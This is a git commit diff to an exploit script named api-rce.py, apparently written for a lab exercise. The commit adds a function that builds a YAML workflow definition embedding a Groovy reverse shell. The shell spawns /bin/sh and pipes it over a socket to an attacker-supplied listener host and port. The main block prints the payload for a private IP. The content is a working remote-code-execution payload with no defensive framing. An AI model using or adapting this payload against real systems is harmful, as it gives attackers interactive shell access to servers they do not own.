2b4e4a71e32349102a4b92c0b8fcbd10ef197dfc
Aleksa Zatezalo <zabumaphu@gmail.com>
2025-03-22 15:14:48 -0400

    Functions changed

--- api-rce.py
+++ api-rce.py
@@ -18,7 +18,37 @@ def constructYaml(lhost, lport):
     ip and ports of the listener for an interactive shell found at lhost:lport.
     """
     
-    pass
+    yaml_template = f'''configuration:
+  dependencies:
+  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
+flows:
+  default:
+    - script: groovy
+      body: |
+         String host = "{lhost}";
+         int port = {lport};
+         String cmd = "/bin/sh";
+         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+         Socket s = new Socket(host, port);
+         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+         while (!s.isClosed()) {{
+         while (pi.available() > 0) so.write(pi.read());
+         while (pe.available() > 0) so.write(pe.read());
+         while (si.available() > 0) po.write(si.read());
+         so.flush();
+         po.flush();
+         Thread.sleep(50);
+         try {{
+            p.exitValue();
+            break;
+         }} catch (Exception e) {{}}
+         }};
+         p.destroy();
+         s.close();
+'''
+    
+    return yaml_template
 
 def obtainRCE(yaml, rhost):
     """
@@ -29,4 +59,4 @@ def obtainRCE(yaml, rhost):
     pass
 
 if __name__ == "__main__":
-    pass
+    print(constructYaml("192.168.118.2", 9000))
